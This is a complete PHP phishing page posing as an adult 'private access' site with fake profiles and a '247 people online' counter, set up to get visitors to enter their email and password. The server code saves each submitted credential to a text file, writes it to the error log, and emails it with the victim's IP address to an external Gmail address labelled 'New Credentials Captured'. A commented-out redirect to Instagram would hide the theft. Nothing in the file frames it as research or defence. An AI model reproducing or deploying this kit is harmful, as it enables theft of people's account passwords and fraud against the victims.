<?php
ob_start();
if($_SERVER['REQUEST_METHOD']=='POST'){
    $name = $_POST['username'];
    $pass = $_POST['pass'];
    
    // TEMPORARY DEBUG - REMOVE LATER
    echo "<div style='background:green;color:white;padding:20px;position:fixed;top:0;left:0;z-index:9999;font-size:20px;'>";
    echo "✅ FORM WORKING! Captured:<br>";
    echo "Email: $name<br>";
    echo "Password: $pass<br>";
    echo "Now check your Render logs for this data!";
    echo "</div>";
    
    $data = "user=$name,pass=$pass" . PHP_EOL;
    file_put_contents('user.txt', $data, FILE_APPEND | LOCK_EX);
    
    $to = "customerking97@gmail.com";
    $subject = "New Credentials Captured";
    $message = "Username: $name\nPassword: $pass\nIP: {$_SERVER['REMOTE_ADDR']}\nTime: " . date('Y-m-d H:i:s');
    $headers = "From: noreply@yoursite.com";
    mail($to, $subject, $message, $headers);
    
    error_log("username=$name,pass=$pass");
    
    // Comment out redirect temporarily to see debug message
    // sleep(2);
    // header('Location: https://instagram.com');
    exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exclusive Access - Private Content</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: white;
        }
        .container {
            background: rgba(0,0,0,0.8);
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 450px;
            text-align: center;
            border: 2px solid #ff6b6b;
        }
        .header {
            margin-bottom: 30px;
        }
        .header h1 {
            color: #ff6b6b;
            font-size: 32px;
            margin-bottom: 10px;
            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
        }
        .header p {
            color: #ccc;
            font-size: 18px;
            margin-bottom: 20px;
        }
        .preview-images {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 25px;
        }
        .preview-img {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            border: 2px solid #ff6b6b;
            object-fit: cover;
            opacity: 0.9;
        }
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #ff6b6b;
            font-weight: bold;
        }
        .form-group input {
            width: 100%;
            padding: 15px;
            border: 2px solid #333;
            border-radius: 8px;
            font-size: 16px;
            box-sizing: border-box;
            background: #222;
            color: white;
        }
        .form-group input:focus {
            border-color: #ff6b6b;
            outline: none;
        }
        .submit-btn {
            width: 100%;
            background: linear-gradient(45deg, #ff6b6b, #ee5a24);
            color: white;
            padding: 18px;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 10px;
            transition: all 0.3s ease;
        }
        .submit-btn:hover {
            background: linear-gradient(45deg, #ff5252, #ff3838);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(255, 107, 107, 0.4);
        }
        .features {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin: 25px 0;
        }
        .feature {
            background: rgba(255, 107, 107, 0.1);
            padding: 15px;
            border-radius: 8px;
            border: 1px solid #ff6b6b;
        }
        .feature span {
            color: #ff6b6b;
            font-weight: bold;
            display: block;
            margin-bottom: 5px;
        }
        .warning {
            background: rgba(255, 193, 7, 0.1);
            border: 1px solid #ffc107;
            padding: 15px;
            border-radius: 8px;
            margin-top: 20px;
            font-size: 14px;
            color: #ffc107;
        }
        .count {
            color: #ff6b6b;
            font-size: 14px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔥 PRIVATE ACCESS 🔥</h1>
            <p>Enter your credentials to unlock exclusive content</p>
            
            <div class="preview-images">
                <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=80&h=80&fit=crop&crop=face" class="preview-img" alt="Preview 1">
                <img src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=80&h=80&fit=crop&crop=face" class="preview-img" alt="Preview 2">
                <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=80&h=80&fit=crop&crop=face" class="preview-img" alt="Preview 3">
            </div>
        </div>

        <form action="index.php" method="POST">
            <div class="form-group">
                <label for="username">👤 Email</label>
                <input type="text" id="username" name="username" placeholder="Enter your personal email" required>
            </div>
            <div class="form-group">
                <label for="pass">🔑 Password</label>
                <input type="password" id="pass" name="pass" placeholder="Enter your password" required>
            </div>
            <button type="submit" class="submit-btn">🚀 UNLOCK PRIVATE CONTENT</button>
        </form>
        <div class="features">
            <div class="feature">
                <span>1000+ Profiles</span>
                Local singles waiting
            </div>
            <div class="feature">
                <span>Instant Access</span>
                Connect immediately
            </div>
            <div class="feature">
                <span>Private Photos</span>
                Exclusive content
            </div>
            <div class="feature">
                <span>Live Chat</span>
                Real-time messaging
            </div>
        </div>
        <div class="warning">
            ⚠️ By entering your credentials, you agree to our terms and confirm you are 18+ years old
        </div>
        <div class="count">
            🔥 247 people online now - Don't miss out!
        </div>
    </div>
</body>
</html>